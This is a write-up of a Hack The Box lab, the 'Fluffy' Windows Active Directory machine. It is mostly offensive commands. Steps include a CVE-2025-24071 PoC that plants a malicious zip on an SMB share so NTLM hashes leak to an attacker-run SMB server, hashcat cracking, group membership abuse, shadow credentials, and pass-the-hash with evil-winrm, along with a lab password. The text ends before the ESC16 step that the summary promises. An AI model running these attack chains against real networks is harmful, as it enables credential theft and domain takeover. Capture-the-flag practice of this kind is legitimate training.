
# Executive Summary – HTB Fluffy

The HTB Fluffy machine is an "Easy" rated Windows Active Directory environment designed to simulate a real-world enterprise network. 

This engagement commenced with initial access via valid credentials for the user `j.fleischman`, provided in a compromised state. Subsequent enumeration and exploitation revealed several critical vulnerabilities:

## Successful Attacks / Compromise
- **CVE-2025-24071**: Vulnerability in Simple DNS Plus allowing NTLMv2 hash extraction.
- **Shadow Credentials Misuse**: Exploitation of GenericWrite permissions to escalate privileges.
- **ESC16 (UPN Spoofing)**: Abuse of Active Directory Certificate Services to forge certificates for administrative access.

> By chaining these vulnerabilities, full domain compromise was achieved, demonstrating the importance of robust credential management and configuration in Active Directory environments.

## Other Findings / Unsuccessful Attacks
- Listing domain users via `rpcclient enumdomusers`, revealing accounts like `Administrator`, `Guest`, `krbtgt`, service accounts (`ca_svc`, `ldap_svc`, `winrm_svc`), and user accounts (`j.coffey`, `p.agila`).  
- Gathering user information via `rpcclient queryuser j.fleischman` (password last set time, logon details, account privileges).  
- Collecting server information via `rpcclient srvinfo` (platform, OS version).  
- Kerberoasting attempted using `GetUserSPNs.py` with valid credentials. Extracted TGS hashes were tested with `Hashcat -m 13100` using wordlists (`rockyou.txt`, `johnlist`, `10k-most-common.txt`) without success.

## Key Takeaways
- Full domain compromise is possible via chained AD vulnerabilities.  
- Valid user credentials provide substantial access for enumeration.  
- Kerberoasting is a high-value attack vector, but strong service account passwords mitigate risk.  
- Detailed AD enumeration (users, groups, privileges) is critical before attempting privilege escalation.


# Detailed reproduction steps for this CVE-2025-24071 & Shadow Credentials Misuse

`sudo nmap -sC -sV 10.129.165.40`
NMAP is tool ised for port scanning, service dction and network disocver. 
- `-sC` runs nmap defaul scripts
- `sV` tries to identify the exact software running. 


<img src="images/nmap_scan.png" alt="nmap scan">


Next enumrate SMB share
`smbmap -H 10.129.165.40 -u "j.fleischman -p J0elTHEM4n1990!"`
 <img src="images/smbmap.png" class="report-images" alt="SMBMAP">

Form this we wee have read and write to IT share so lets see connect to that share and see if there is anything in it.

`smbclient //10.129.165.40/IT -U "j.fleischman"`


smb: \> ls
  .                                   D        0  Fri Sep  5 20:08:31 2025
  ..                                  D        0  Fri Sep  5 20:08:31 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025

Download UPgrade_Notice.pdf and you will see a list of vulnerbites that need patching. 
![!PDF on the SMB](images/notice.png)

To find a good example of how to run a exploit CVE- Title -github poc in google. 
You should find https://github.com/LOOKY243/CVE-2025-24071-PoC


### Steps
1. Copy the exploit.py file to your machine 
2. python3 `exploit.py -i 10.10.16.40 -s shared -f evil`
 3. Start listener for hash capture:
   `sudo impacket-smbserver shared /home/franky/Documents/FLUFFY -smb2support`
   3. Upload payload to target IT share.
      `put evil.zip`

4. You should see username + hash on listner.

5. Crack the with rockyou.txt: 
  `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

6. Create a BloodHound file and upload to bloodhound review.
      `sudo nxc ldap dc01.fluffy.htb -u '<USERNAME>' -p '<PASSWORD>' \
      --bloodhound --collection All --dns-tcp --dns-server <TARGET_IP>`
7. `BloodHound`
8. Should see BloodHound open in new tab in firefox
9. Upload the ladp file we created to upload 
10. Search for User we enumerated
11. Examine relationships and you will see this 


![BloodHound Scan](images/Bloodhound.png)


12. If examine WINRM_SVC in BloddHound, it is member of remote services add can remote login. If we try to use EVil-winrm for user p.agila or J.FLEISCHMAN will see users dint have permisison. 

Observations form BloodHound

The user we found is in SERVICE ACCOUNT MANAGERS, which has full control (GenericAll) over SERVICE ACCOUNTS; SERVICE ACCOUNTS can modify WINRM_SVC (GenericWrite).

Implications: User can indirectly modify service accounts. Compromising this user could allow escalation to WINRM_SVC via the permission chain. WINRM_SVC can access remote login is and likely has the flag. 

## Preparations

- Start a virtual environment in your folder and install the following tools in a virtual environment:
  - `pywhisker`
  - `PKINITtools`
  - `faketime`


---

### Add User to Service Accounts

`net rpc group addmem "Service Accounts" "<USER>" \
  -U "dc01.fluffy.htb"/"<USER>" -S "<TARGET_IP>"`


### Request Kerberos TGT for Service Account

If your local time does not match the Domain Controller (DC), you may encounter errors. Synchronize time first:

`sudo rdate -n <TARGET_IP>`



`faketime <DATE_TIME> python3 gettgtpkinit.py \ -cert-pem key_cert.pem \ -key-pem key_priv.pem \ fluffy.htb/<SERVICE_ACCOUNT> \  <SERVICE_ACCOUNT>.ccache`


### Set the Kerberos ticket environment variable:

> Why we do this: 

 > When you log in with a valid ticket, it gets stored in /tmp/krb5cc_<UID>.

> All Kerberos-enabled tools (smbclient, psexec.py, ldapsearch, etc.) will look in that default location to authenticate.

> But in a pentest, you often manually extract or forge tickets (e.g., with impacket, Mimikatz, or AD CS attacks). Those tickets don’t automatically go to /tmp/krb5cc_<UID>. They’re saved in a .ccache file.

> So, to make Kerberos-aware tools use your forged/extracted ticket, you tell them where it is:

`export KRB5CCNAME=<SERVICE_ACCOUNT>.ccache`


Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an absolute path if necessary.

### Retrieve NT Hash

`faketime <DATE_TIME> python3 getnthash.py \ -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>`

### Access Service Account
`evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>`



